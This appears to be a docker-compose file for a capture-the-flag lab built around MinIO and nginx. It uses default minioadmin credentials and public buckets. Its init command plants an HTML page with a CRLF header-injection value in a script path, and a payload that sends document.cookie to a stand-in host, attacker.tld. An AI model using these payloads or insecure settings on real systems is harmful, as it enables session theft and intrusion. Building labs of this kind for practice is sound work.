version: '3.8'

services:
  minio:
    image: minio/minio:latest
    container_name: minio-ctf
    ports:
      - "9000:9000"
      - "9001:9001"
    environment:
      MINIO_ROOT_USER: minioadmin
      MINIO_ROOT_PASSWORD: minioadmin
      MINIO_DOMAIN: minio  # Enables virtual-hosted-style requests like http://bucket.minio:9000/object
    volumes:
      - minio_data:/data
    command: server /data --console-address ":9001"
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:9000/minio/health/live"]
      interval: 30s
      timeout: 20s
      retries: 3
    networks:
      - ctfnet

  init-buckets:
    image: minio/mc:latest
    container_name: init-buckets
    depends_on:
      minio:
        condition: service_healthy
    environment:
      MINIO_ROOT_USER: minioadmin
      MINIO_ROOT_PASSWORD: minioadmin
    entrypoint: /bin/sh
    command: -c "mc alias set local http://minio:9000 minioadmin minioadmin && mc mb --ignore-existing local/volga-static-site && mc anonymous set public local/volga-static-site && mc mb --ignore-existing local/attacker-bucket && mc anonymous set public local/attacker-bucket && echo -e '<!DOCTYPE html>\\\\n<html>\\\\n<head>\\\\n    <title>Vulnerable Static Site</title>\\\\n    <meta http-equiv=\\\"Content-Security-Policy\\\" content=\\\"default-src \\\\'self\\\\'; script-src \\\\'self\\\\';\\\">\\\\n</head>\\\\n<body>\\\\n    <h1>Static Content Loaded</h1>\\\\n    <script src=\\\"/static/xss.js%20HTTP/1.1%0d%0aHost:%20attacker-bucket.minio%0d%0a%0d%0a\\\"></script>\\\\n</body>\\\\n</html>' > /tmp/xss.html && mc cp /tmp/xss.html local/volga-static-site/static/xss.html --attr 'Content-Type=text/html' && echo -e '<!DOCTYPE html>\\\n<html><head><title>Hacked</title></head>\\\n<body><h1>Exfiltrated!</h1>\\\n<script>\\\nlocation.replace(\'//attacker.tld/?\' + document.cookie);\\\n</script></body></html>' > /tmp/payload.html && mc cp /tmp/payload.html local/attacker-bucket/static/xss.js --attr 'Content-Type=text/html' && mc cp /tmp/payload.html local/attacker-bucket/static/xss.html --attr 'Content-Type=text/html' && echo 'done'"
    volumes:
      - minio_data:/data  # Shared with minio for persistence
    networks:
      - ctfnet

  nginx:
    image: nginx:latest
    container_name: nginx-ctf
    ports:
      - "80:80"
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf:ro
      - ./html:/var/www/html:ro
    depends_on:
      init-buckets:
        condition: service_completed_successfully
    networks:
      - ctfnet

  # Optional: Simple exfil endpoint (like httpbin) for testing cookie theft
  exfil:
    image: kennethreitz/httpbin:latest
    container_name: exfil-server
    ports:
      - "8080:80"
    networks:
      - ctfnet

volumes:
  minio_data:

networks:
  ctfnet:
    driver: bridge